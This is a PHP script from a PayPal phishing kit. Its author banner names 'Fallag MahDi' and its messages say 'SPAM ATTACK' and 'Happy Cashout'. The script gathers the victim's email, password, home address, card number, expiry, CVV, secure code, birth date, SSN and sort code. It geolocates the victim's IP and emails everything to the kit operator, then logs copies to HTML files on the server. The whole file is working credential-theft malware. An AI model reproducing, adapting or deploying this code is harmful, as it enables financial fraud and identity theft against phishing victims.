<?php
#####################################################################################################
###################################### fallagmahdi@hotmail.com ######################################
###### ####### ##      ##      #######  #######       #### #### ####### ##     ##   ######   ########
##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##     ##   ##    ##    ##
###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### #########   ##     ##   ##
##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##     ##   ##    ##    ##
##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##     ##   ######   ########
############################## https://www.facebook.com/fallag.mahdi.tn #############################
#####################################################################################################
session_start();
include("inc/config.php");
date_default_timezone_set("Africa/Tunis");
$rand = $_GET['dispatch'];
$status = json_decode(CheckCVV($_POST,$_SESSION), true);
if($status['status'] == "false")
{
	die('<META HTTP-EQUIV="Refresh" Content="0; URL=post3.php?dispatch='.$rand.'&id=wrong">');
}

$ip = getenv("REMOTE_ADDR");
$ch = curl_init('http://api.hostip.info/get_json.php?ip='.$ip);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
$obj = json_decode($output);
if($obj->{'country_name'} == "(Unknown Country?)"){
	$con = "XXXXXXX";
} else {
	$con = $obj->{'country_name'};
}
if($obj->{'city'} == "(Unknown City?)"){
	$cit = "XXXXXXX";
} else {
	$cit = $obj->{'city'};
}
$_SESSION['Done'] = 0;
$hostname = gethostbyaddr($ip);
$userag = $_SERVER['HTTP_USER_AGENT']; 
$date = date('d-m-Y', time());
$time = date('H:i:s', time());
$msg =  "<div style='font-size:13px;font-family:monospace'>";
$msg .= "<b>------------------+| SPAM ATTACK (2015) |+------------</b><br><br>";
$msg .= "MAIL = <b>".$_SESSION['email']."</b><br>";
$msg .= "PASS = <b>".$_SESSION['pass']."</b><br>";
$msg .= "NAME = <b>".$_SESSION['fullname']."</b><br>";
$msg .= "ADRS = <b>".$_SESSION['street1']."</b><br>";
$msg .= "CITY = <b>".$_SESSION['city']."</b><br>";
$msg .= "STAT = <b>".$_SESSION['state']."</b><br>";
$msg .= "OZIP = <b>".$_SESSION['postalCode']."</b><br>";
$msg .= "Cntr = <b>".$_SESSION['country']."</b><br>";
$msg .= "OCCN = <b>".$_POST['CC']."</b><br>";
$msg .= "OEXP = <b>".$_POST['EM']."/".$_POST['EY']."</b><br>";
$msg .= "OCVV = <b>".$_POST['CV']."</b><br>";
$msg .= "SECC = <b>".$_POST['SC']." --> Secure Code</b><br>";
$msg .= "BRTH = <b>".$_POST['BD']."</b><br>";
$msg .= "OSNN = <b>".$_POST['SN']."</b><br>";
$msg .= "SRTC = <b>".$_POST['SO']." --> Sort Code</b><br>";
$msg .= "<b><br>------------------+| Automated Information <i>(By IP)</i> |+------------</b> <br><br>";
$msg .= "CNTR = <b>".$con."</b> <IMG SRC='http://api.hostip.info/flag.php?ip=".$ip."' style='width: 26px;' ><br>\n";
$msg .= "CITY = <b>".$cit."</b><br>\n";
$msg .= "OOIP = <a href='http://www.geoiptool.com/?IP=$ip' target='_blank'>$ip (Click for more information)</a><br>";
$msg .= "TIME = <b>".$time."</b><br>\n";
$msg .= "DATE = <b>".$date."</b><br>\n";
$msg .= "USER = <b>".$userag."</b><br>\n";
$msg .= "<b><br>------------------+| Fallag MàhDi |+------------ </b>";
$msg .= "<b><br>------------------+| Happy Cashout :) |+------------ </b></div><br>";
$msg = wordwrap($msg,70);
$sub = "FG MD > PayPal ♥ VBV ♥ | $ip | ".$_SESSION['email'];
$head = "MIME-Version: 1.0" . "\r\n";
$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$head .= "From: VBV.Rez" . "\r\n";
if($m2 == 1) {
	$myFile = "../rezmdf.html";
	$fh = @fopen($myFile, 'a+') or die("can't open file");
	@fwrite($fh, $msg);
	@fclose($fh);
}
mail($to,$sub,$msg,$head);
$msg = "<b>".$_SESSION['email']." </b> with <b>$ip</b> has finished from <b>Payment</b> at <b>$time - $date</b>, Check your email for VBV and FULL ! Say Thanks to Màh Di<br>";
$myFile = "../ips.html";
$fh = fopen($myFile, 'a+') or die("can't open file");
fwrite($fh, $msg);
fclose($fh);
$css = css_while();
$html = html_while_3($css, "");
die($html);

?>
